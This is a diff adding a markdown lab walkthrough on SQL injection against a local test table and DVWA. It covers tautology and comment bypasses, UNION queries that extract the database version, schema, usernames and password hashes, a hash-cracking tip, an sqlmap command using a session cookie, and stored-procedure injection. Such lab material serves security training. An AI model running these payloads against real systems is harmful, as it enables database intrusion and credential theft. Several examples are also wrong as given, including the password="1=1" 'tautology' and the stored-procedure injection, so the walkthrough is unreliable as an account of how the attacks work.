@@ -1,0 +1,274 @@
+# 🚩 **Practical: SQL Injection — phpMyAdmin, DVWA, Burp Suite, SQLMAP**
+
+## 🗂️ **Part 1: Setup — Create a Test Database**
+
+---
+
+### ✅ **1️⃣ Open phpMyAdmin**
+
+- On your **Windows VM**, open browser:
+
+  ```
+  localhost:8080/phpmyadmin/
+  ```
+
+- **Login** with your DB root user if needed.
+
+---
+
+### ✅ **2️⃣ Create Database & Table**
+
+- **Create Database:**
+  Name: `ditiss`
+
+- **Create Table:**
+  Name: `students`
+  Columns: **5**
+
+| Column Name  | Type    | Length | NULL |
+| ------------ | ------- | ------ | ---- |
+| student_name | varchar | 50     | ✔️   |
+| username     | varchar | 50     | ✔️   |
+| password     | varchar | 50     | ✔️   |
+| email        | varchar | 50     | ✔️   |
+| mobile       | varchar | 10     | ✔️   |
+
+✅ Click **Save**.
+
+---
+
+### ✅ **3️⃣ Insert Test Data**
+
+Add **5 dummy records**, e.g.:
+
+```
+student_name | username | password  | email               | mobile
+---------------------------------------------------------------------------
+Tom          | tom      | P@ssword  | tom@example.com     | 9876543210
+Jerry        | jerry    | test123   | jerry@example.com   | 9876543211
+Mickey       | mickey   | abc@123   | mickey@example.com  | 9876543212
+Donald       | donald   | quack321  | donald@example.com  | 9876543213
+Goofy        | goofy    | goofy456  | goofy@example.com   | 9876543214
+```
+
+---
+
+## 🗂️ **Part 2: Test SELECT Queries & Injection**
+
+---
+
+✅ Open **SQL tab** in phpMyAdmin or use your vulnerable web form (if any).
+
+---
+
+### ✅ **Basic Valid Login**
+
+```sql
+SELECT * FROM students WHERE username="tom" AND password="P@ssword";
+```
+
+✔️ **Output:** 1 record
+
+---
+
+### ✅ **Basic SQL Injection**
+
+**Bypass with tautology:**
+
+```sql
+SELECT * FROM students WHERE username="tom" AND password="1=1";
+```
+
+✅ Always returns **true** → returns Tom’s row if query is poorly validated.
+
+---
+
+### ✅ **Use Comments (#)**
+
+**Bypass whole WHERE clause:**
+
+```sql
+SELECT * FROM students WHERE username='tom' AND '1'='1'# password=' ';
+```
+
+✔️ `#` comments out the rest.
+
+---
+
+**Show all rows:**
+
+```sql
+SELECT * FROM students WHERE username='user1' OR '1'='1'# password=' ';
+```
+
+✅ Returns **all students** if vulnerable.
+
+---
+
+---
+
+## 🗂️ **Part 3: SQL UNION — Join Extra Data**
+
+---
+
+✅ **Basic UNION**
+
+```sql
+SELECT student_name, email, mobile FROM students WHERE username='tom'
+UNION SELECT 1,2,3;
+```
+
+✅ **Output:** Combines real row + dummy `1,2,3`.
+
+---
+
+**Leak DB Version:**
+
+```sql
+SELECT student_name, email, mobile FROM students WHERE username='tom'
+UNION SELECT 1, version(), 3;
+```
+
+✔️ Returns `10.4.32-MariaDB` (example).
+
+---
+
+**List Tables:**
+
+```sql
+SELECT student_name, email, mobile FROM students WHERE username='tom'
+UNION SELECT 1, TABLE_NAME, 3 FROM information_schema.tables;
+```
+
+---
+
+**List Columns:**
+
+```sql
+SELECT student_name, email, mobile FROM students WHERE username='tom'
+UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE TABLE_NAME='students';
+```
+
+---
+
+**Extract Usernames & Passwords:**
+
+```sql
+SELECT student_name, email, mobile FROM students WHERE username='tom'
+UNION SELECT username, password, NULL FROM students;
+```
+
+---
+
+**Find DB Name:**
+
+```sql
+SELECT student_name, email, mobile FROM students WHERE username='tom'
+UNION SELECT NULL, SCHEMA_NAME, NULL FROM information_schema.schemata;
+```
+
+---
+
+## 🗂️ **Part 4: Try on Real DVWA**
+
+---
+
+✅ **URL:** `http://localhost:8080/dvwa`
+
+Login → Go to **SQL Injection** module.
+
+---
+
+### ✅ **Test Inputs:**
+
+```
+User ID: '
+User ID: 1' OR '1'='1'#
+User ID: 1' UNION SELECT 1,2#
+User ID: 1' UNION SELECT 1,version()#
+User ID: a' UNION SELECT 1,database()#
+User ID: a' UNION SELECT 1,user()#
+```
+
+✔️ See output:
+
+- DB version
+- DB name (`dvwa`)
+- Current DB user (`dvwa@localhost`)
+
+---
+
+**Find Columns:**
+
+```
+1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #
+```
+
+✔️ Returns user table columns.
+
+---
+
+**Dump Hashes:**
+
+```
+1' UNION SELECT user, password FROM users #
+```
+
+Use **crackstation.net** to crack common MD5 hashes (`5f4dcc3b5aa765d61d8327deb882cf99` → `password`).
+
+---
+
+## 🗂️ **Part 5: Use Burp Suite & sqlmap**
+
+---
+
+✅ Intercept vulnerable request in **Burp**.
+
+Example:
+
+```bash
+sqlmap --url="http://192.168.80.154:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -H "Cookie: PHPSESSID=....; security=low" -p id --dbs
+```
+
+✔️ `--dbs` → enumerate databases.
+
+---
+
+## 🗂️ **Part 6: Stored Procedure Injection**
+
+---
+
+✅ Example Stored Procedure:
+
+```sql
+DELIMITER //
+CREATE PROCEDURE usr_Login4(name VARCHAR(50), Pass VARCHAR(50))
+BEGIN
+  SELECT * FROM students WHERE username = name AND password = Pass;
+END //
+DELIMITER ;
+```
+
+**Run legit:**
+
+```sql
+CALL usr_Login4('sam', 'P@ssword');
+```
+
+**Inject:**
+
+```sql
+CALL usr_Login4('sam' OR '1'='1', 'P@ssword');
+```
+
+✅ If input is not sanitized, this returns all rows.
+
+---
+
+## ✅ **Best References**
+
+- 📚 [Imperva SQLi Guide](https://www.imperva.com/learn/application-security/sql-injection-sqli/)
+- 📚 [DVWA SQLi Walkthrough](https://medium.com/@waeloueslati18/exploring-dvwa-a-walkthrough-of-the-sql-injection-challenge-part-7-7ada1ae784f2)
+- 📚 [CSPANIAS DVWA Post](https://cspanias.github.io/posts/DVWA-SQL-Injection/)
+
+---
